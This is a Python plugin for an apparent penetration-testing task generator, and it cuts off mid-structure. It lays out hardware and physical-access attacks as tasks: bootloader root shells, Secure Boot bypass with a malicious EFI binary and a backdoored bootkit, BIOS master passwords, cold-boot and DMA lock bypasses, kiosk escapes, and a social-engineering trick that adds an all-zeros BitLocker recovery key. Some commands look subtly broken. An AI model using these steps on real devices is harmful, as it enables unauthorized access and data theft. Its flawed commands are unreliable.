"""
Hardware & Physical Access security testing plugin

Generates tasks for hardware and physical security testing including:
- Firmware analysis (binwalk, extraction, filesystem examination)
- Bootloader attacks (U-Boot, UEFI, GRUB manipulation)
- Physical hardware exploitation (JTAG, UART, SPI flash)
- BIOS/UEFI password recovery and secure boot bypass
- Kiosk escape techniques (GUI application breakout)
- Cold boot attacks and RAM analysis
- DMA attacks (FireWire, Thunderbolt)
- BadUSB and device implantation
- Chassis intrusion switch exploitation

Extracted from HackTricks: hardware-physical-access/
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class HardwarePhysicalAccessPlugin(ServicePlugin):
    """Hardware and physical security testing plugin"""

    @property
    def name(self) -> str:
        return "hardware_physical_access"

    @property
    def default_ports(self) -> List[int]:
        return []  # Physical access doesn't use network ports

    @property
    def service_names(self) -> List[str]:
        return ['hardware', 'physical', 'firmware', 'bootloader', 'jtag', 'uart']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect hardware/physical testing scenarios

        This plugin is manually triggered, not auto-detected from scans.
        It matches patterns in service names or notes fields.
        """
        service = port_info.get('service', '').lower()
        notes = port_info.get('notes', '').lower()

        # Check for hardware-related keywords
        keywords = ['firmware', 'bootloader', 'jtag', 'uart', 'physical',
                    'bios', 'uefi', 'hardware', 'embedded', 'iot']

        return any(keyword in service or keyword in notes for keyword in keywords)

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate hardware/physical access testing task tree"""

        device_type = service_info.get('product', 'Unknown Device')
        version = service_info.get('version', '')

        tasks = {
            'id': 'hardware-physical-access',
            'name': f'Hardware & Physical Access Testing: {device_type}',
            'type': 'parent',
            'children': []
        }

        # CATEGORY 1: Firmware Analysis
        firmware_tasks = {
            'id': 'firmware-analysis',
            'name': 'Firmware Analysis',
            'type': 'parent',
            'children': []
        }

        # Task 1.1: Acquire Firmware
        firmware_tasks['children'].append({
            'id': 'firmware-acquire',
            'name': 'Acquire Firmware Image',
            'type': 'manual',
            'metadata': {
                'description': 'Obtain firmware image from device, manufacturer, or cloud storage',
                'tags': ['OSCP:LOW', 'MANUAL', 'RECON'],
                'notes': f'''
Methods to acquire firmware for {device_type}:

1. Download from manufacturer support site
   - Check vendor website for firmware downloads
   - Look for update archives and release notes

2. Google dork queries
   - intitle:"index of" firmware {device_type}
   - filetype:bin firmware {device_type}

3. Cloud storage enumeration
   - S3Scanner: python3 s3scanner.py --bucket firmware-updates
   - Check common bucket names: firmware-*, updates-*, {device_type.lower()}-*

4. Intercept update process (MITM)
   - mitmproxy -p 8080 --set ssl_insecure=true
   - Configure device to use proxy, trigger update

5. Physical extraction (if device available)
   - UART serial connection (115200 baud typically)
   - JTAG debugging interface
   - SPI flash chip removal and reading
   - Bootloader memory dump

6. Extract from mobile companion app
   - Decompile APK: apktool d app.apk
   - Check assets/ and res/ directories for bundled firmware

Success indicators:
- .bin, .img, .rom, .fw file obtained
- File size matches device flash capacity
- Magic bytes match expected firmware format

Time estimate: 15 minutes to 2 hours depending on method
''',
                'alternatives': [
                    'Search GitHub for firmware repositories',
                    'Check VirusTotal for uploaded firmware samples',
                    'Request firmware from vendor support',
                    'Dump from working device using vendor tools'
                ]
            }
        })

        # Task 1.2: Analyze Firmware Binary
        firmware_tasks['children'].append({
            'id': 'firmware-analyze',
            'name': 'Analyze Firmware Binary',
            'type': 'command',
            'metadata': {
                'command': f'file firmware.bin && strings -n8 firmware.bin | head -100 && binwalk -E firmware.bin',
                'description': 'Identify firmware file type, extract strings, check entropy for encryption',
                'tags': ['OSCP:LOW', 'ENUM'],
                'flag_explanations': {
                    'file': 'Identify file type using magic bytes',
                    'strings -n8': 'Extract ASCII strings (min 8 chars) for recon',
                    'binwalk -E': 'Entropy analysis (low=unencrypted, high=encrypted/compressed)',
                    'head -100': 'Show first 100 strings (manageable output)'
                },
                'success_indicators': [
                    'File type identified (e.g., "u-boot legacy uImage")',
                    'Strings reveal OS type, compiler, paths',
                    'Entropy plot shows compression/encryption regions'
                ],
                'failure_indicators': [
                    'File type "data" (unknown format)',
                    'No readable strings (heavily encrypted)',
                    'Uniform high entropy (full disk encryption)'
                ],
                'next_steps': [
                    'If low entropy: Extract filesystem with binwalk -ev',
                    'If high entropy: Search for decryption keys in device firmware',
                    'Analyze header for signature verification',
                    'Check for update server endpoints in strings'
                ],
                'alternatives': [
                    'hexdump -C -n 512 firmware.bin  # View header',
                    'binvis.io  # Visual binary analysis',
                    'radare2 -A firmware.bin  # Reverse engineering'
                ],
                'notes': 'Check for hardcoded credentials in strings output. Time estimate: 5 minutes.'
            }
        })

        # Task 1.3: Extract Filesystem
        firmware_tasks['children'].append({
            'id': 'firmware-extract',
            'name': 'Extract Firmware Filesystem',
            'type': 'command',
            'metadata': {
                'command': 'binwalk -ev firmware.bin',
                'description': 'Extract embedded filesystem and files from firmware image',
                'tags': ['OSCP:LOW', 'ENUM'],
                'flag_explanations': {
                    '-e': 'Extract discovered files (creates _firmware.bin.extracted/)',
                    '-v': 'Verbose output (show extraction progress)',
                    'binwalk': 'Firmware analysis tool (identifies filesystems, archives, signatures)'
                },
                'success_indicators': [
                    'Filesystem extracted (squashfs, jffs2, cramfs, etc.)',
                    'Directory created: _firmware.bin.extracted/',
                    'Root filesystem visible (bin/, etc/, lib/, www/)'
                ],
                'failure_indicators': [
                    'No filesystems detected',
                    'Extraction errors (corrupted or encrypted)',
                    'Empty output directory'
                ],
                'next_steps': [
                    'Navigate to extracted filesystem: cd _firmware.bin.extracted/squashfs-root/',
                    'Search for credentials: grep -r "password" etc/',
                    'Check startup scripts: cat etc/init.d/*',
                    'Analyze web server: ls www/ htdocs/ html/'
                ],
                'alternatives': [
                    'Manual extraction: dd if=firmware.bin bs=1 skip=OFFSET of=fs.squashfs',
                    'unsquashfs fs.squashfs  # Manual squashfs extraction',
                    'jefferson fs.jffs2  # JFFS2 extraction',
                    'ubireader_extract_images -u UBI firmware.bin  # UBIFS'
                ],
                'notes': 'Common filesystem types: squashfs (compressed), jffs2 (flash), ubifs (NAND). Time estimate: 2-5 minutes.',
                'time_estimate': '2-5 minutes'
            }
        })

        # Task 1.4: Filesystem Security Analysis
        firmware_tasks['children'].append({
            'id': 'firmware-filesystem-enum',
            'name': 'Filesystem Security Enumeration',
            'type': 'manual',
            'metadata': {
                'description': 'Search extracted filesystem for vulnerabilities, credentials, and attack vectors',
                'tags': ['OSCP:LOW', 'ENUM', 'MANUAL'],
                'notes': '''
Enumerate extracted filesystem for security issues:

1. Hardcoded Credentials
   grep -r "password" etc/ www/
   grep -r "admin" etc/shadow etc/passwd
   cat etc/shadow  # Check for weak/default passwords

2. SSL Certificates and Private Keys
   find . -name "*.pem" -o -name "*.key" -o -name "*.crt"
   openssl rsa -in private.key -text  # Analyze private key

3. Network Service Binaries
   ls bin/ sbin/ usr/bin/ usr/sbin/
   file bin/*  # Identify binaries (look for telnetd, ftpd, httpd)
   strings bin/httpd | grep -i version  # Version info

4. Startup Scripts (Privilege Escalation)
   cat etc/init.d/*
   cat etc/rc.local
   # Look for: world-writable files, insecure PATH, SUID binaries

5. Web Server Files (RCE, LFI, SQLi)
   ls www/ htdocs/ html/
   grep -r "eval(" www/  # PHP code injection
   grep -r "system(" www/  # Command execution
   grep -r "\\$_GET" www/  # Unsanitized input

6. Configuration Files
   cat etc/config/*
   # Look for: API keys, update URLs, backend IPs, debug flags

7. Compile-time Security (if source available)
   checksec.sh bin/httpd  # Check for NX, ASLR, PIE, RELRO

8. EMBA automated analysis
   ./emba.sh -f firmware.bin -l /tmp/emba_logs/

Success: Credentials found, RCE vector identified, or weak binary protection
Time estimate: 30 minutes to 2 hours
''',
                'alternatives': [
                    'LinPEAS: wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh',
                    'Firmwalker: ./firmwalker.sh extracted_firmware/',
                    'FACT (Firmware Analysis Comparison Tool): docker run fkiecad/fact'
                ]
            }
        })

        tasks['children'].append(firmware_tasks)

        # CATEGORY 2: Bootloader Attacks
        bootloader_tasks = {
            'id': 'bootloader-attacks',
            'name': 'Bootloader Attacks',
            'type': 'parent',
            'children': []
        }

        # Task 2.1: U-Boot Exploitation
        bootloader_tasks['children'].append({
            'id': 'uboot-interrupt',
            'name': 'U-Boot Interrupt & Shell Access',
            'type': 'manual',
            'metadata': {
                'description': 'Interrupt U-Boot boot process to gain shell access and modify boot parameters',
                'tags': ['OSCP:LOW', 'MANUAL', 'EXPLOIT'],
                'notes': '''
U-Boot bootloader exploitation (embedded devices):

1. Interrupt boot sequence
   - Connect via UART (115200 baud typically)
   - screen /dev/ttyUSB0 115200
   - Power on device and press key during boot (try: Enter, Space, 0, any key)
   - Watch for "Hit any key to stop autoboot" message

2. Explore U-Boot environment
   U-Boot> printenv           # Show all environment variables
   U-Boot> bdinfo             # Board info (memory addresses)
   U-Boot> help               # List available commands
   U-Boot> version            # U-Boot version

3. Modify boot arguments for root shell
   U-Boot> setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 init=/bin/sh'
   U-Boot> saveenv            # Persist changes
   U-Boot> boot               # Boot with modified args (drops to root shell)

4. Boot custom kernel from TFTP (network boot)
   U-Boot> setenv ipaddr 192.168.1.100      # Device IP
   U-Boot> setenv serverip 192.168.1.50     # TFTP server IP
   U-Boot> saveenv
   U-Boot> ping ${serverip}                 # Test connectivity
   U-Boot> tftpboot ${loadaddr} zImage      # Download kernel
   U-Boot> tftpboot ${fdt_addr_r} dtb.dtb  # Device tree
   U-Boot> booti ${loadaddr} - ${fdt_addr_r}

5. Check for insecure features
   - bootdelay > 0 (allows interrupt)
   - No signature verification (CONFIG_FIT_SIGNATURE disabled)
   - Writable environment (saveenv works)
   - Access to fatload, ext4load, usb commands

Success indicators:
- U-Boot shell access obtained
- Boot parameters modified
- Custom kernel booted
- Root shell obtained via init=/bin/sh

Time estimate: 15-45 minutes (hardware setup + exploitation)
''',
                'alternatives': [
                    'GRUB bootloader: Press "e" at boot menu, add "init=/bin/sh" to linux line',
                    'Single user mode: Add "single" or "1" to kernel parameters'
                ]
            }
        })

        # Task 2.2: UEFI Secure Boot Bypass
        bootloader_tasks['children'].append({
            'id': 'uefi-secureboot-bypass',
            'name': 'UEFI Secure Boot Analysis',
            'type': 'command',
            'metadata': {
                'command': 'python chipsec_main.py -module exploits.secure.boot.pk',
                'description': 'Analyze and attempt to bypass UEFI Secure Boot protections',
                'tags': ['OSCP:LOW', 'EXPLOIT'],
                'flag_explanations': {
                    'chipsec_main.py': 'Hardware security analysis tool for UEFI/BIOS',
                    '-module': 'Load specific test module',
                    'exploits.secure.boot.pk': 'Test Secure Boot Platform Key security'
                },
                'success_indicators': [
                    'Secure Boot disabled or bypassable',
                    'Platform Key (PK) modifiable',
                    'Untrusted bootloader accepted'
                ],
                'failure_indicators': [
                    'Secure Boot enforced correctly',
                    'PK locked in hardware',
                    'Firmware updates rejected'
                ],
                'next_steps': [
                    'If vulnerable: Disable Secure Boot and boot custom OS',
                    'Mount ESP: mount /dev/sda1 /mnt/esp',
                    'Replace bootloader: cp malicious.efi /mnt/esp/EFI/Boot/bootx64.efi',
                    'Install backdoored kernel'
                ],
                'alternatives': [
                    'Manual: Enter UEFI setup, try disabling Secure Boot',
                    'Check dbx (revocation list) for outdated entries',
                    'LogoFAIL: Place crafted BMP in \\EFI\\vendor\\logo\\',
                    'Test old signed shims: Use known-vulnerable signed bootloader'
                ],
                'notes': 'Requires physical access to device. Secure Boot bypass = full system compromise. Time estimate: 30 minutes to 2 hours.'
            }
        })

        # Task 2.3: BIOS Password Recovery
        bootloader_tasks['children'].append({
            'id': 'bios-password-recovery',
            'name': 'BIOS Password Recovery',
            'type': 'manual',
            'metadata': {
                'description': 'Recover or bypass BIOS/UEFI passwords using hardware and software techniques',
                'tags': ['OSCP:LOW', 'MANUAL', 'EXPLOIT'],
                'notes': '''
BIOS/UEFI password recovery methods:

1. CMOS Battery Removal (Hardware Reset)
   - Power off and unplug device
   - Open case and locate CMOS battery (CR2032 coin cell)
   - Remove battery for 30+ minutes
   - Reinsert battery and power on
   - BIOS settings reset to defaults (password cleared)

2. CMOS Jumper Reset
   - Locate "CLR_CMOS" or "PSWD" jumper on motherboard
   - Move jumper to reset position for 10 seconds
   - Return jumper to normal position
   - BIOS password cleared

3. Backdoor Passwords (from error codes)
   - Enter wrong password 3 times
   - Note error code displayed
   - Visit https://bios-pw.org
   - Enter error code to get master password

4. Software Tools (Live CD/USB)
   - Boot Kali Linux Live USB
   - Run: killCmos  # Clear CMOS via software
   - Run: CmosPWD /k  # Kill BIOS password

5. Manufacturer Master Passwords
   - Dell: "dell"
   - HP: "hp"
   - IBM: "IBM" or "MBIUO"
   - Phoenix: "phoenix"
   - Award: "award"

6. SPI Flash Programmer (Advanced)
   - Use CH341A USB programmer
   - Read BIOS chip directly
   - Modify or replace BIOS image
   - Write back to chip

Success: BIOS accessible without password, boot order modifiable
Time estimate: 15 minutes (jumper) to 2 hours (chip programmer)
''',
                'alternatives': [
                    'Contact manufacturer for master password (social engineering)',
                    'Replace motherboard (last resort)',
                    'Use debug mode (hold specific key combination during boot)'
                ]
            }
        })

        # Task 2.4: Chassis Intrusion Switch Exploit
        bootloader_tasks['children'].append({
            'id': 'chassis-intrusion',
            'name': 'Chassis Intrusion Switch Factory Reset',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit chassis intrusion/maintenance switches to factory-reset BIOS settings',
                'tags': ['OSCP:LOW', 'MANUAL', 'EXPLOIT'],
                'notes': '''
Chassis Intrusion Switch Exploitation (Framework Laptop, HP, Dell, etc.):

Attack Overview:
Many modern laptops include a chassis intrusion switch monitored by the
Embedded Controller (EC). Vendors sometimes implement undocumented recovery
shortcuts triggered by specific switch toggle patterns that factory-reset
the BIOS/UEFI, clearing passwords and Secure Boot keys.

Example: Framework 13 Laptop Reset Pattern
1. Power on device (EC must be running)
2. Remove bottom cover to expose intrusion switch
3. Perform toggle pattern:
   - Press and hold switch for 2 seconds
   - Release and wait 2 seconds
   - Repeat this cycle 10 times
4. On 10th cycle, EC flags NVRAM wipe for next reboot
5. Reassemble device and reboot
6. BIOS loads defaults: supervisor password GONE, Secure Boot DISABLED

Generic Exploitation Steps:
1. Power on or suspend-resume target (activate EC)
2. Remove bottom cover (requires screwdriver only)
3. Locate maintenance/intrusion switch (small button near chassis edge)
4. Reproduce vendor-specific toggle pattern:
   - Consult device forums, service manuals
   - Reverse-engineer EC firmware if available
   - Try common patterns: 3 rapid presses, 5 slow presses, etc.
5. Reassemble and reboot
6. Verify firmware protections disabled
7. Boot malicious USB/PXE image for post-exploitation

Post-Reset Actions:
- Boot Kali Linux Live USB
- Mount encrypted drives (BitLocker keys may be in TPM)
- Dump SAM/SYSTEM hives: reg save HKLM\\SAM sam.hive
- Install backdoored UEFI bootkit
- Extract credentials with Mimikatz

Detection & Mitigation:
- Log chassis-intrusion events in OS (correlate with BIOS resets)
- Use tamper-evident seals on screws/covers
- Physical access control (locked server rooms)
- Disable maintenance switch feature if available

Success: BIOS password cleared, Secure Boot disabled, full system access
Time estimate: 5-15 minutes (requires only screwdriver)
''',
                'alternatives': [
                    'Social engineering: Trick user into resetting BIOS',
                    'Evil maid attack: Physical access while device unattended'
                ]
            }
        })

        tasks['children'].append(bootloader_tasks)

        # CATEGORY 3: Physical Hardware Attacks
        hardware_tasks = {
            'id': 'physical-hardware',
            'name': 'Physical Hardware Attacks',
            'type': 'parent',
            'children': []
        }

        # Task 3.1: UART Serial Access
        hardware_tasks['children'].append({
            'id': 'uart-serial',
            'name': 'UART Serial Console Access',
            'type': 'manual',
            'metadata': {
                'description': 'Connect to device UART serial console for debugging shell access',
                'tags': ['OSCP:LOW', 'MANUAL', 'HARDWARE'],
                'notes': '''
UART (Universal Asynchronous Receiver-Transmitter) exploitation:

Hardware Requirements:
- USB-to-TTL serial adapter (FTDI FT232, CP2102, CH340)
- Jumper wires (female-female)
- Multimeter (to identify pins)

Step 1: Identify UART Pins
- Look for 4-pin header on PCB (labeled TX, RX, GND, VCC)
- Common locations: Near SoC, edge of board, debug headers
- Use multimeter continuity mode:
  * GND: Connect to shield or ground plane
  * TX: Voltage fluctuates during boot (data output)
  * RX: Constant voltage (data input)
  * VCC: 3.3V or 5V constant

Step 2: Connect Serial Adapter
- Adapter GND  → Device GND
- Adapter RX   → Device TX (crossed!)
- Adapter TX   → Device RX (crossed!)
- Do NOT connect VCC (risk of damage)

Step 3: Determine Baud Rate
- Common rates: 115200, 9600, 57600, 38400
- Try each until readable output appears
- Screen command: screen /dev/ttyUSB0 115200
- Minicom: minicom -D /dev/ttyUSB0 -b 115200

Step 4: Interact with Console
- Power on device and watch boot messages
- Look for:
  * U-Boot prompt (press key during boot)
  * Linux login prompt (try default credentials)
  * BusyBox shell
  * Debug messages revealing credentials/paths

Step 5: Obtain Root Shell
- If login required:
  * Try: admin/admin, root/root, root/password
  * Check firmware strings for defaults
- If U-Boot accessible:
  * Modify bootargs: setenv bootargs "init=/bin/sh"
  * Boot to root shell

Common UART-based Attacks:
1. Boot parameter injection (init=/bin/sh)
2. Memory dump via bootloader
3. Firmware extraction from console
4. Privilege escalation via debug commands
5. Reset to factory defaults

Success: Root shell access via serial console
Time estimate: 30 minutes to 2 hours (hardware identification + exploitation)
''',
                'alternatives': [
                    'JTAG debugging interface (more complex but more powerful)',
                    'SPI flash chip direct read (requires desoldering)'
                ]
            }
        })

        # Task 3.2: Cold Boot Attack
        hardware_tasks['children'].append({
            'id': 'cold-boot-attack',
            'name': 'Cold Boot Attack (RAM Extraction)',
            'type': 'manual',
            'metadata': {
                'description': 'Extract encryption keys and secrets from RAM after power loss',
                'tags': ['OSCP:LOW', 'MANUAL', 'HARDWARE'],
                'notes': '''
Cold Boot Attack - RAM data remanence exploitation:

Background:
RAM retains data briefly after power loss (1-2 minutes at room temp,
10+ minutes when cooled with compressed air or liquid nitrogen). This
allows extraction of sensitive data like encryption keys, passwords,
and session tokens.

Attack Steps:

1. Prepare Tools
   - Linux Live USB with memory dump tools
   - dd.exe (Windows) or dd (Linux)
   - Volatility Framework for analysis
   - Compressed air or freeze spray (optional: liquid nitrogen)

2. Induce Cold Boot
   - While target is running, spray RAM modules with compressed air
   - Quickly power off system (hard shutdown)
   - RAM data persists 1-2 min (standard) or 10+ min (frozen)

3. Boot from Live USB
   - Boot Kali Linux or custom forensic distro FAST
   - Time is critical (data decays rapidly)

4. Dump Physical Memory
   Linux:
     dd if=/dev/mem of=/mnt/usb/memdump.raw bs=1M

   Windows (use dd.exe from live environment):
     dd.exe if=\\\\.\\PhysicalMemory of=D:\\memdump.raw

5. Analyze Memory Dump
   volatility -f memdump.raw imageinfo  # Identify OS profile
   volatility -f memdump.raw --profile=Win7SP1x64 hivelist  # Registry
   volatility -f memdump.raw --profile=Win7SP1x64 hashdump  # Passwords

   Search for encryption keys:
     strings memdump.raw | grep -i "luks"  # LUKS keys
     strings memdump.raw | grep -i "bitlocker"  # BitLocker keys
     aeskeyfind memdump.raw  # AES key finder
     rsakeyfind memdump.raw  # RSA key finder

6. Decrypt Disk with Extracted Keys
   If BitLocker key found:
     bdemount -k RECOVERED_KEY encrypted.vhd /mnt/decrypted

   If LUKS key found:
     cryptsetup luksOpen /dev/sda1 decrypted --master-key-file key.bin

Defenses Bypassed:
- Full disk encryption (FDE)
- BitLocker, LUKS, FileVault
- Screen lock passwords
- Session encryption keys

Success Indicators:
- Memory dump captured within 2 minutes
- Encryption keys extracted from dump
- Encrypted disk successfully decrypted

Time estimate: 15 minutes (requires fast execution)
Success rate: 60-80% (depends on RAM type and timing)
''',
                'alternatives': [
                    'FireWire DMA attack (works on powered system)',
                    'Thunderbolt DMA attack (PCIe access)',
                    'RAM chip direct reading (requires desoldering)'
                ]
            }
        })

        # Task 3.3: DMA Attacks
        hardware_tasks['children'].append({
            'id': 'dma-attack',
            'name': 'DMA Attack (FireWire/Thunderbolt)',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit Direct Memory Access via FireWire or Thunderbolt to bypass authentication',
                'tags': ['OSCP:LOW', 'EXPLOIT', 'HARDWARE'],
                'notes': '''
Direct Memory Access (DMA) Attack:

Overview:
FireWire (IEEE 1394) and Thunderbolt interfaces grant DMA access to
physical memory, allowing attackers to read/write RAM directly, bypassing
OS security, screen locks, and full disk encryption.

Attack Tool: INCEPTION
- GitHub: https://github.com/carmaa/inception
- Supports: FireWire, Thunderbolt, ExpressCard
- Targets: Windows XP-8, Linux, macOS (NOT Windows 10+)

Attack Steps:

1. Hardware Setup
   - FireWire cable (6-pin to 6-pin or 4-pin to 6-pin)
   - Thunderbolt cable (for newer devices)
   - Attacker laptop with FireWire/Thunderbolt port

2. Install INCEPTION
   git clone https://github.com/carmaa/inception.git
   cd inception
   sudo apt-get install python3-msgpack python3-serial

3. Identify Target OS
   - Windows 7/8: Use INCEPTION to patch winlogon.exe in memory
   - Linux: Patch PAM authentication
   - macOS: Patch loginwindow process

4. Execute Attack
   Unlock Windows without password:
     sudo ./incept --target 0x00000000 --unlock

   Escalate to SYSTEM:
     sudo ./incept --target 0x00000000 --escalate

   Dump memory regions:
     sudo ./incept --target 0x00000000 --dump

5. Manual Memory Patching
   - Locate authentication function in memory
   - Patch return value to always succeed
   - Example: NOP out password check in memory

6. Persistence
   - Install backdoor via DMA-modified memory
   - Create new admin account
   - Disable Windows Defender via memory

Limitations:
- Windows 10+ has IOMMU protection (blocks DMA by default)
- Requires physical port access
- Target must be powered on (screen lock bypass)
- Does NOT work if BitLocker key is TPM-only

Defenses Bypassed:
- Screen lock (Windows, Linux, macOS)
- Full disk encryption (if system is unlocked)
- BIOS/UEFI passwords (OS already booted)

Success: Logged in without password, admin privileges obtained
Time estimate: 5-15 minutes
''',
                'alternatives': [
                    'PCILeech: Similar tool for PCIe DMA attacks',
                    'USB Rubber Ducky: HID keystroke injection (not true DMA)'
                ]
            }
        })

        tasks['children'].append(hardware_tasks)

        # CATEGORY 4: Kiosk Escape Techniques
        kiosk_tasks = {
            'id': 'kiosk-escape',
            'name': 'Kiosk & GUI Application Escape',
            'type': 'parent',
            'children': []
        }

        # Task 4.1: Windows Kiosk Breakout
        kiosk_tasks['children'].append({
            'id': 'windows-kiosk-escape',
            'name': 'Windows Kiosk Escape Techniques',
            'type': 'manual',
            'metadata': {
                'description': 'Escape restricted Windows kiosk environments to gain full system access',
                'tags': ['OSCP:LOW', 'MANUAL', 'EXPLOIT'],
                'notes': '''
Windows Kiosk Escape Methods:

1. Common Dialog Exploitation
   Trigger file dialogs to access Explorer:
   - File → Open/Save As
   - Print Dialog (Ctrl+P)
   - Export/Import options
   - Font/Color selection dialogs

   From dialog:
   - Type C:\\Windows\\System32\\ in address bar
   - Right-click → Open in new window
   - Navigate to cmd.exe and execute

2. Keyboard Shortcuts
   Try these key combinations:
   - Ctrl+N: New instance of application
   - Ctrl+Shift+Esc: Task Manager (if not disabled)
   - Windows+E: Open Explorer
   - Windows+R: Run dialog
   - Windows+D: Show Desktop
   - F11: Toggle fullscreen (may reveal taskbar)
   - Shift (5x): Sticky Keys dialog → Help → Hyperlink escape
   - Windows+U: Ease of Access Center

3. Shell Protocol URIs
   Type these in address bars to open Explorer:
   - shell:Administrative Tools
   - shell:System
   - shell:DocumentsLibrary
   - shell:UserProfiles
   - shell:::{20D04FE0-3AEA-1069-A2D8-08002B30309D}  (My Computer)

4. UNC Path Exploitation
   - \\\\127.0.0.1\\c$\\Windows\\System32
   - file:///C:/Windows/System32/cmd.exe
   - %SYSTEMROOT%\\System32\\cmd.exe

5. Command Execution via "Open With"
   If file dialog accessible:
   - Browse to executables
   - Right-click → Open With → Browse
   - Navigate to: cmd.exe, powershell.exe, mmc.exe

   Execute via LOLBins:
   - mmc.exe: Loads management consoles
   - eventvwr.msc: Event Viewer (can launch cmd)
   - taskmgr.exe: Task Manager → File → Run new task
   - at.exe: Schedule command execution

6. Internet Explorer Tricks
   If IE accessible:
   - Ctrl+O: Open file dialog
   - Type: file:///C:/Windows/System32/cmd.exe
   - Image toolbar: Right-click image → Save As → File dialog
   - Help → hyperlinks → Open in new window

7. Touch/Swipe Gestures (Tablets)
   - Swipe from left: Show all windows (minimize kiosk)
   - Swipe from right: Action Center
   - Swipe from top: Title bar in fullscreen
   - Swipe from bottom: Show taskbar

Success: cmd.exe or Explorer launched with full privileges
Time estimate: 5-30 minutes (try multiple methods)
''',
                'alternatives': [
                    'Physical device tampering (USB keyboard with programmable macros)',
                    'BadUSB attack (HID keystroke injection)',
                    'Power button: Force shutdown → boot to Safe Mode → F8'
                ]
            }
        })

        # Task 4.2: Linux/iPad Kiosk Escape
        kiosk_tasks['children'].append({
            'id': 'linux-ipad-kiosk-escape',
            'name': 'Linux & iPad Kiosk Escape',
            'type': 'manual',
            'metadata': {
                'description': 'Escape restricted Linux and iPad kiosk environments',
                'tags': ['OSCP:LOW', 'MANUAL', 'EXPLOIT'],
                'notes': '''
Linux Kiosk Escape:

1. Terminal Access
   - Ctrl+Alt+F1 to F6: Switch to TTY console
   - Ctrl+Alt+F7: Return to GUI
   - If TTY accessible, login as root or user

2. Execute Commands via GUI
   - Use "Open With" to launch:
     * bash, sh, zsh (shell)
     * xterm, gnome-terminal (terminal emulator)
     * nautilus, dolphin (file manager)

3. GTFOBins Exploitation
   If restricted to specific apps, check https://gtfobins.github.io/
   Example: vim escape
     :shell  # Drop to shell from vim
     :!bash  # Execute bash from vim

4. Environment Variable Abuse
   - Check PATH: echo $PATH
   - Prepend malicious path: export PATH=/tmp:$PATH
   - Create fake binary in /tmp

5. X11 Display Hijacking
   - xdotool: Simulate keypresses
   - xdotool key ctrl+alt+t  # Open terminal

iPad Kiosk Escape:

1. Gestures
   - Swipe up with 4-5 fingers: Multitask view
   - Pinch 5 fingers: Home screen
   - Double-tap Home button: App switcher
   - Swipe down from top-right: Control Center
   - Swipe down from top: Notifications

2. Keyboard Shortcuts (if external keyboard)
   - Cmd+H: Home
   - Cmd+Shift+H: Home (alternative)
   - Cmd+Space: Spotlight (search and launch apps)
   - Cmd+Tab: App switcher
   - Escape: Back button
   - Cmd+Shift+3: Screenshot (save and open in editor)

3. Siri/VoiceOver Abuse
   - Hold Home button: Activate Siri
   - Ask Siri to "Open Settings" or "Open Safari"
   - VoiceOver shortcuts: Ctrl+Option+H (Home)

4. Safari Exploits (if browser accessible)
   - File upload dialog: Browse file system
   - View source: Right-click → Inspect Element → Console
   - JavaScript: document.write('<input type=file>')

Success: Escaped to unrestricted environment, full app access
Time estimate: 10-45 minutes
''',
                'alternatives': [
                    'Physical device reset: Hold Power + Home for hard reset',
                    'MDM bypass: Remove management profile via recovery mode'
                ]
            }
        })

        tasks['children'].append(kiosk_tasks)

        # CATEGORY 5: BitLocker/Encryption Bypass
        bitlocker_tasks = {
            'id': 'bitlocker-bypass',
            'name': 'BitLocker & Encryption Bypass',
            'type': 'parent',
            'children': []
        }

        # Task 5.1: BitLocker Recovery Key Extraction
        bitlocker_tasks['children'].append({
            'id': 'bitlocker-recovery',
            'name': 'BitLocker Recovery Key Extraction',
            'type': 'manual',
            'metadata': {
                'description': 'Extract BitLocker recovery keys from memory dumps or system files',
                'tags': ['OSCP:LOW', 'EXPLOIT'],
                'notes': '''
BitLocker Encryption Bypass Methods:

1. Memory Dump Analysis (if system is running)
   - Capture memory: Use cold boot attack or DMA
   - Search for recovery key in MEMORY.DMP:
     strings MEMORY.DMP | grep -E "[0-9]{6}-[0-9]{6}-[0-9]{6}-[0-9]{6}-[0-9]{6}-[0-9]{6}-[0-9]{6}-[0-9]{6}"

   - Tools:
     * Elcomsoft Forensic Disk Decryptor
     * Passware Kit Forensic
     * Volatility (bitlocker plugin)

2. Registry/System File Extraction
   Boot from Live USB:
     mount /dev/sda2 /mnt
     reg save HKLM\\SAM /mnt/backup/SAM
     reg save HKLM\\SYSTEM /mnt/backup/SYSTEM

   Extract keys:
     bitlocker2john /mnt/backup/SYSTEM > hash.txt
     john hash.txt --wordlist=rockyou.txt

3. TPM Sniffing (Advanced)
   - Use TPM sniffing hardware (e.g., TPM Genie)
   - Intercept key material during boot
   - Requires: Physical access + hardware tools

4. Social Engineering - Add Recovery Key
   Trick authenticated user to run:
     manage-bde -protectors -add C: -recoverypassword 000000-000000-000000-000000-000000-000000-000000-000000

   Now unlock with all-zeros key:
     manage-bde -unlock C: -RecoveryPassword 000000-000000-...

5. Hibernation File Analysis
   If hiberfil.sys accessible:
     volatility -f hiberfil.sys bitlocker --profile=Win10x64

6. Volume Shadow Copy Extraction
   If admin access to running system:
     vssadmin create shadow /for=C:
     copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM .

Success: BitLocker recovery key obtained, encrypted drive mounted
Time estimate: 30 minutes to 4 hours (depends on method)
''',
                'alternatives': [
                    'Brute-force recovery key (impractical - 48 digits)',
                    'Exploit TPM vulnerability (device-specific)',
                    'Extract key from Active Directory (if domain-joined)'
                ]
            }
        })

        tasks['children'].append(bitlocker_tasks)

        # Add version-specific exploit research if version detected
        if version and version.lower() != 'unknown':
            exploit_research = {
                'id': 'hardware-exploit-research',
                'name': f'Exploit Research: {device_type} {version}',
                'type': 'parent',
                'children': [
                    {
                        'id': 'searchsploit-hardware',
                        'name': f'SearchSploit: {device_type} {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'searchsploit "{device_type} {version}"',
                            'description': 'Search ExploitDB for known hardware/firmware vulnerabilities',
                            'tags': ['OSCP:LOW', 'RESEARCH']
                        }
                    },
                    {
                        'id': 'cve-lookup-hardware',
                        'name': f'CVE Lookup: {device_type}',
                        'type': 'manual',
